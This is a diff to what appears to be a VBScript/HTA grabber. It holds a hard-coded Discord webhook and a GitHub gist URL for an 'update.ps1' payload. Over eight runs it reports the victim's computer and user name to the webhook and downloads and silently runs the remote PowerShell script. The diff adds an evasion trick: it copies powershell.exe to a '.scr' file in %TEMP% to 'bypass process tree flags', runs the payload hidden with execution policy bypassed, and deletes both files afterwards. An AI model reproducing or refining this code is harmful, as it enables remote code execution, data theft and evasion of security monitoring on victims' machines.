@@ -12,7 +12,7 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 ' PUT YOUR WEBHOOK AND GIST URL HERE
 ' ==========================================
 WH = "https://discord.com/api/webhooks/1568351976972877926/u0AFPPLPFJOjDwiCVmJRWbe9ZtqUUzEC3rUjzyQfMeib4o3LkZcv82iDRTYBzKkW9I4n"
-GIST_URL = "https://gist.githubusercontent.com/alexproisgamer-dotcom/607e9edddbab4ca67ebbfe0146767f06/raw/5f067aef3a8fd4131a49a2b7a16079f23fa74d62/update.ps1"
+GIST_URL = "https://gist.githubusercontent.com/alexproisgamer-dotcom/607e9edddbab4ca67ebbfe0146767f06/raw/e6af6051649c4fc64df75ad2c13b21bd6d7faa91/update.ps1"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
@@ -22,7 +22,7 @@ Dim runCount
 For runCount = 1 To 8
     Call PostEmbed(":repeat: Re-grab " & runCount & "/8", "PC: " & PC & " | User: " & USER, 3447003)
     Call RunGist
-    If runCount < 8 Then WScript.Sleep 600000 ' Native 10-minute sleep
+    If runCount < 8 Then WScript.Sleep 600000 ' 10 minutes
 Next
 
 window.close()
@@ -44,11 +44,17 @@ Sub RunGist()
     f.Write pc
     f.Close
     
+    ' Copy PowerShell to .scr to bypass process tree flags
+    Dim psexec : psexec = sh.ExpandEnvironmentStrings("%TEMP%") & "\p.scr"
+    Dim realPs : realPs = sh.ExpandEnvironmentStrings("%SystemRoot%") & "\System32\WindowsPowerShell\v1.0\powershell.exe"
+    fso.CopyFile realPs, psexec, True
+    
     ' Run it silently
-    sh.Run "powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File """ & psf & """", 0, True
+    sh.Run """" & psexec & """ -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File """ & psf & """", 0, True
     
     ' Cleanup
     fso.DeleteFile psf, True
+    fso.DeleteFile psexec, True
 End Sub
 
 Sub PostEmbed(t, d, c)
